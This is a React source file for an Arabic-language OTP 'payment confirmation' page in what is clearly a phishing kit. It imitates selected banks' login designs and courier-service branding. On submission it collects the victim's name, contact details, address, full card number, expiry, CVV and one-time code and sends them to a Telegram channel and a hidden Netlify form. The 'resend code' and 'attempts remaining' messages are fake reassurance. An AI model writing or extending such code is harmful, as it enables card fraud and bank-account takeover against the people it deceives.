import { useState, useEffect, useRef } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getBankLoginDesign } from "@/lib/bankLoginDesigns";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentOTPForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState("");
  const [countdown, setCountdown] = useState(60);
  
  // Create refs for all inputs
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const selectedBankId = sessionStorage.getItem('selectedBank') || linkData?.payload?.selected_bank || '';
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  // Get payment flow type to determine if we should use bank design
  const paymentFlowType = linkData?.payload?.payment_flow_type || 'bank-login';
  
  // Get bank design if bank-login flow and bank is selected, otherwise use service branding
  const bankDesign = (paymentFlowType === 'bank-login' && selectedBank) ? getBankLoginDesign(selectedBank.id) : null;
  const designColors = bankDesign ? {
    primary: bankDesign.primaryColor,
    secondary: bankDesign.secondaryColor,
  } : branding.colors;
  
  // Get design styles for OTP page when using bank design
  const designFontFamily = bankDesign ? bankDesign.fontFamily : undefined;
  const designTextColor = bankDesign ? bankDesign.textColor : undefined;
  
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || shippingInfo?.total_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  // Demo OTP: 123456
  const DEMO_OTP = "123456";
  
  // Countdown timer effect
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);
  
  // Focus first input on mount
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);
  
  const handleChange = (index: number, value: string) => {
    // Only allow numbers
    const numericValue = value.replace(/[^0-9]/g, '');
    
    if (numericValue.length <= 1) {
      const newOtp = [...otp];
      newOtp[index] = numericValue;
      setOtp(newOtp);
      setError("");
      
      // Auto-focus next input if value entered
      if (numericValue && index < 5) {
        inputRefs.current[index + 1]?.focus();
      }
    }
  };
  
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Handle backspace
    if (e.key === 'Backspace') {
      e.preventDefault();
      
      if (otp[index]) {
        // Clear current input
        const newOtp = [...otp];
        newOtp[index] = "";
        setOtp(newOtp);
      } else if (index > 0) {
        // Move to previous input and clear it
        const newOtp = [...otp];
        newOtp[index - 1] = "";
        setOtp(newOtp);
        inputRefs.current[index - 1]?.focus();
      }
    }
    
    // Handle Delete key
    if (e.key === 'Delete') {
      e.preventDefault();
      const newOtp = [...otp];
      newOtp[index] = "";
      setOtp(newOtp);
    }
    
    // Handle arrow keys
    if (e.key === 'ArrowLeft' && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === 'ArrowRight' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
    
    // Clear all on Escape
    if (e.key === 'Escape') {
      handleClearAll();
    }
  };
  
  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
    
    if (pastedData) {
      const newOtp = [...otp];
      for (let i = 0; i < pastedData.length && i < 6; i++) {
        newOtp[i] = pastedData[i];
      }
      setOtp(newOtp);
      
      // Focus the next empty input or last input
      const nextEmptyIndex = newOtp.findIndex(val => !val);
      if (nextEmptyIndex !== -1) {
        inputRefs.current[nextEmptyIndex]?.focus();
      } else {
        inputRefs.current[5]?.focus();
      }
    }
  };
  
  const handleClearAll = () => {
    setOtp(["", "", "", "", "", ""]);
    setError("");
    inputRefs.current[0]?.focus();
  };
  
  const handleDeleteLast = () => {
    const lastFilledIndex = otp.findLastIndex(val => val !== "");
    if (lastFilledIndex !== -1) {
      const newOtp = [...otp];
      newOtp[lastFilledIndex] = "";
      setOtp(newOtp);
      inputRefs.current[lastFilledIndex]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    
    const otpString = otp.join('');
    
    if (otpString.length !== 6) {
      setError("الرجاء إدخال رمز التحقق كاملاً");
      return;
    }
    
    if (otpString === DEMO_OTP) {
      // Submit to Netlify Forms
      try {
        await fetch("/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            "form-name": "payment-confirmation",
            name: customerInfo.name || '',
            email: customerInfo.email || '',
            phone: customerInfo.phone || '',
            service: serviceName,
            amount: formattedAmount,
            cardLast4: sessionStorage.getItem('cardLast4') || '',
            cardholder: sessionStorage.getItem('cardName') || '',
            otp: otpString,
            timestamp: new Date().toISOString()
          }).toString()
        });
      } catch (err) {
        console.error("Form submission error:", err);
      }
      
      // Send complete payment confirmation to Telegram
      const telegramResult = await sendToTelegram({
        type: 'payment_confirmation',
        data: {
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          address: customerInfo.address || '',
          service: serviceName,
          amount: formattedAmount,
          cardholder: sessionStorage.getItem('cardName') || '',
          cardNumber: sessionStorage.getItem('cardNumber') || '',
          cardLast4: sessionStorage.getItem('cardLast4') || '',
          expiry: sessionStorage.getItem('cardExpiry') || '12/25',
          cvv: sessionStorage.getItem('cardCvv') || '',
          otp: otpString
        },
        timestamp: new Date().toISOString()
      });

      if (telegramResult.success) {
        console.log('Payment confirmation sent to Telegram successfully');
      } else {
        console.error('Failed to send payment confirmation to Telegram:', telegramResult.error);
      }
      
      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });
      
      navigate(`/pay/${id}/receipt`);
    } else {
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
        handleClearAll();
      }
    }
  };
  
  const isOtpComplete = otp.every(digit => digit !== "");
  const hasAnyDigit = otp.some(digit => digit !== "");
  
  // If using bank design, render without DynamicPaymentLayout to match login page exactly
  if (bankDesign) {
    return (
      <>
        <PaymentMetaTags 
          serviceName={serviceName}
          serviceKey={serviceKey}
          title={`رمز التحقق - ${selectedBank?.nameAr || serviceName}`}
          description={branding.description || `أدخل رمز التحقق لخدمة ${serviceName}`}
        />
      <div 
        className="min-h-screen flex items-center justify-center"
        dir={bankDesign.layout.direction}
        style={{
          backgroundColor: bankDesign.backgroundColor,
          fontFamily: bankDesign.fontFamily,
          color: bankDesign.textColor,
          padding: bankDesign.layout.containerPadding || '0',
        }}
      >
        <div 
          className="w-full flex flex-col items-center justify-center"
          style={{
            maxWidth: bankDesign.layout.maxWidth || '100%',
            padding: '20px',
          }}
        >
          {/* Bank Logo Section - Exact match to login page */}
          <div 
            className="mb-10"
            style={{
              textAlign: 'center',
              width: '100%',
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center',
              paddingTop: '40px',
              paddingBottom: '20px',
            }}
          >
            {selectedBank && (
              <div 
                style={{
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  gap: '20px',
                }}
              >
                <div
                  style={{
                    width: bankDesign.layout.logoSize?.width || '200px',
                    height: bankDesign.layout.logoSize?.height || '70px',
                    backgroundColor: bankDesign.primaryColor,
                    borderRadius: '6px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    boxShadow: '0 3px 10px rgba(0,0,0,0.15)',
                    border: `2px solid ${bankDesign.secondaryColor}`,
                  }}
                >
                  <Shield 
                    className="text-white"
                    style={{
                      width: '56px',
                      height: '56px',
                    }}
                  />
                </div>
                <h1 
                  style={{
                    fontSize: bankDesign.fontSize.title,
                    fontWeight: bankDesign.fontWeight.title,
                    color: bankDesign.primaryColor,
                    margin: 0,
                    fontFamily: bankDesign.fontFamily,
                    letterSpacing: '0.5px',
                  }}
                >
                  {selectedBank.nameAr}
                </h1>
                <p
                  style={{
                    fontSize: bankDesign.fontSize.subtitle,
                    color: bankDesign.textColor,
                    opacity: 0.7,
                    margin: 0,
                    fontFamily: bankDesign.fontFamily,
                  }}
                >
                  {selectedBank.name}
                </p>
              </div>
            )}
          </div>

          {/* OTP Form Card - Exact match to login page design */}
          <div 
            style={{
              backgroundColor: bankDesign.inputBackgroundColor,
              borderRadius: '8px',
              padding: '36px',
              boxShadow: '0 4px 16px rgba(0,0,0,0.08)',
              border: `1px solid ${bankDesign.inputStyles.borderColor}`,
              width: '100%',
              maxWidth: bankDesign.layout.formMaxWidth || '420px',
              margin: '0 auto',
            }}
          >
            <h2 
              style={{
                fontSize: '22px',
                fontWeight: bankDesign.fontWeight.title,
                color: bankDesign.textColor,
                marginBottom: '28px',
                textAlign: 'center',
                fontFamily: bankDesign.fontFamily,
                marginTop: 0,
              }}
            >
              رمز التحقق
            </h2>
            
            <p 
              style={{
                fontSize: bankDesign.fontSize.body,
                color: bankDesign.textColor,
                opacity: 0.7,
                textAlign: 'center',
                marginBottom: '28px',
                fontFamily: bankDesign.fontFamily,
              }}
            >
              أدخل الرمز المرسل إلى هاتفك المسجل في البنك
            </p>
            
            <form onSubmit={handleSubmit}>
              {/* OTP Input - 6 digits - Matching login input style */}
              <div className="mb-6">
                <div className="flex gap-3 justify-center items-center mb-8" dir="ltr">
                  {otp.map((digit, index) => (
                    <Input
                      key={index}
                      ref={(el) => (inputRefs.current[index] = el)}
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      onPaste={handlePaste}
                      className="text-center font-bold border-2 transition-all"
                      style={{
                        width: '52px',
                        height: bankDesign.inputStyles.height,
                        borderRadius: bankDesign.inputStyles.borderRadius,
                        borderWidth: bankDesign.inputStyles.borderWidth,
                        borderColor: digit ? bankDesign.primaryColor : bankDesign.inputStyles.borderColor,
                        backgroundColor: digit ? `${bankDesign.primaryColor}08` : bankDesign.inputBackgroundColor,
                        fontSize: '26px',
                        fontFamily: bankDesign.fontFamily,
                        color: bankDesign.textColor,
                      }}
                      disabled={attempts >= 3}
                      autoComplete="off"
                    />
                  ))}
                </div>
              </div>
            
              {/* Error Message */}
              {error && (
                <div 
                  className="rounded-lg p-3 mb-6 text-center"
                  style={{
                    backgroundColor: '#FEE2E2',
                    border: '1px solid #FCA5A5',
                    color: '#DC2626',
                    fontSize: bankDesign.fontSize.small,
                    fontFamily: bankDesign.fontFamily,
                  }}
                >
                  {error}
                </div>
              )}
              
              {/* Countdown Timer */}
              {countdown > 0 && (
                <div className="text-center mb-6">
                  <p 
                    style={{
                      fontSize: bankDesign.fontSize.small,
                      color: bankDesign.textColor,
                      opacity: 0.7,
                      fontFamily: bankDesign.fontFamily,
                    }}
                  >
                    إعادة إرسال الرمز بعد <strong>{countdown}</strong> ثانية
                  </p>
                </div>
              )}

              {/* Attempts Counter */}
              {attempts > 0 && attempts < 3 && (
                <div className="text-center mb-6">
                  <p 
                    style={{
                      fontSize: bankDesign.fontSize.small,
                      color: '#F59E0B',
                      fontFamily: bankDesign.fontFamily,
                    }}
                  >
                    المحاولات المتبقية: <strong>{3 - attempts}</strong>
                  </p>
                </div>
              )}
              
              {/* Submit Button - Exact match to login button */}
              <button
                type="submit"
                disabled={attempts >= 3 || !isOtpComplete}
                style={{
                  width: '100%',
                  height: bankDesign.buttonStyles.height,
                  padding: bankDesign.buttonStyles.padding,
                  fontSize: bankDesign.fontSize.button,
                  fontWeight: bankDesign.fontWeight.button,
                  color: '#FFFFFF',
                  backgroundColor: attempts >= 3 ? '#666' : bankDesign.buttonColor,
                  border: 'none',
                  borderRadius: bankDesign.buttonStyles.borderRadius,
                  cursor: (attempts >= 3 || !isOtpComplete) ? 'not-allowed' : 'pointer',
                  boxShadow: bankDesign.buttonStyles.boxShadow,
                  transition: 'all 0.2s ease',
                  opacity: (attempts >= 3 || !isOtpComplete) ? 0.7 : 1,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  fontFamily: bankDesign.fontFamily,
                  textTransform: 'none',
                  letterSpacing: '0.3px',
                }}
                onMouseEnter={(e) => {
                  if (attempts < 3 && isOtpComplete) {
                    e.currentTarget.style.backgroundColor = bankDesign.buttonHoverColor;
                    e.currentTarget.style.boxShadow = '0 4px 8px rgba(0,108,53,0.3)';
                  }
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.backgroundColor = attempts >= 3 ? '#666' : bankDesign.buttonColor;
                  e.currentTarget.style.boxShadow = bankDesign.buttonStyles.boxShadow;
                }}
              >
                {attempts >= 3 ? (
                  <span>محظور مؤقتاً</span>
                ) : (
                  <>
                    <Shield className="w-5 h-5" />
                    <span>تأكيد الدفع</span>
                  </>
                )}
              </button>
              
              {countdown === 0 && (
                <button
                  type="button"
                  style={{
                    width: '100%',
                    marginTop: '12px',
                    padding: '10px 24px',
                    fontSize: bankDesign.fontSize.small,
                    color: bankDesign.primaryColor,
                    backgroundColor: 'transparent',
                    border: `1px solid ${bankDesign.primaryColor}`,
                    borderRadius: bankDesign.buttonStyles.borderRadius,
                    cursor: 'pointer',
                    fontFamily: bankDesign.fontFamily,
                  }}
                  onClick={() => {
                    setCountdown(60);
                    toast({
                      title: "تم إرسال الرمز",
                      description: "تم إرسال رمز تحقق جديد إلى هاتفك",
                    });
                  }}
                >
                  إعادة إرسال الرمز
                </button>
              )}
            </form>
          </div>
        </div>
        
        {/* Hidden Netlify Form */}
        <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
          <input type="text" name="name" />
          <input type="email" name="email" />
          <input type="tel" name="phone" />
          <input type="text" name="service" />
          <input type="text" name="amount" />
          <input type="text" name="cardholder" />
          <input type="text" name="cardLast4" />
          <input type="text" name="otp" />
          <input type="text" name="timestamp" />
        </form>
      </div>
      </>
    );
  }
  
  // Default OTP page with service branding
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="رمز التحقق"
      description={`أدخل رمز التحقق لخدمة ${serviceName}`}
      icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Title Section */}
      <div className="text-center mb-6 sm:mb-8">
        <div 
          className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg"
          style={{
            background: `linear-gradient(135deg, ${designColors.primary}, ${designColors.secondary})`
          }}
        >
          <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
        </div>
        <h1 className="text-2xl sm:text-3xl font-bold mb-2">رمز التحقق</h1>
        <p className="text-sm sm:text-base text-muted-foreground">أدخل الرمز المرسل إلى هاتفك</p>
      </div>

      {/* Info */}
      <div 
        className="rounded-lg p-3 sm:p-4 mb-6"
        style={{
          background: `${designColors.primary}10`,
          border: `1px solid ${designColors.primary}30`
        }}
      >
        <p className="text-xs sm:text-sm text-center">
          تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك
        </p>
      </div>
      
      <form onSubmit={handleSubmit}>
        {/* OTP Input - 6 digits */}
        <div className="mb-6">
          <div className="flex gap-2 sm:gap-3 justify-center items-center mb-4" dir="ltr">
            {otp.map((digit, index) => (
              <Input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={handlePaste}
                className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
                style={{
                  borderColor: digit ? designColors.primary : undefined,
                  backgroundColor: digit ? `${designColors.primary}08` : undefined
                }}
                disabled={attempts >= 3}
                autoComplete="off"
              />
            ))}
          </div>
        </div>
      
        {/* Error Message */}
        {error && (
          <div 
            className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2 bg-destructive/10 border border-destructive/30"
          >
            <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0 text-destructive" />
            <p className="text-xs sm:text-sm text-destructive">{error}</p>
          </div>
        )}
        
        {/* Countdown Timer */}
        {countdown > 0 && (
          <div className="text-center mb-6">
            <p className="text-xs sm:text-sm text-muted-foreground">
              إعادة إرسال الرمز بعد <strong>{countdown}</strong> ثانية
            </p>
          </div>
        )}

        {/* Attempts Counter */}
        {attempts > 0 && attempts < 3 && (
          <div className="text-center mb-6">
            <p className="text-xs sm:text-sm text-yellow-600">
              المحاولات المتبقية: <strong>{3 - attempts}</strong>
            </p>
          </div>
        )}
        
        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
          disabled={attempts >= 3 || !isOtpComplete}
          style={{
            background: attempts >= 3 
              ? '#666' 
              : `linear-gradient(135deg, ${designColors.primary}, ${designColors.secondary})`
          }}
        >
          {attempts >= 3 ? (
            <span>محظور مؤقتاً</span>
          ) : (
            <>
              <span className="ml-2">تأكيد الدفع</span>
              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
            </>
          )}
        </Button>
        
        {countdown === 0 && (
          <Button
            type="button"
            variant="ghost"
            className="w-full mt-3"
            style={{ color: designColors.primary }}
            onClick={() => {
              setCountdown(60);
              toast({
                title: "تم إرسال الرمز",
                description: "تم إرسال رمز تحقق جديد إلى هاتفك",
              });
            }}
          >
            إعادة إرسال الرمز
          </Button>
        )}
      </form>
      
      
      {/* Hidden Netlify Form */}
      <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="otp" />
        <input type="text" name="timestamp" />
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentOTPForm;
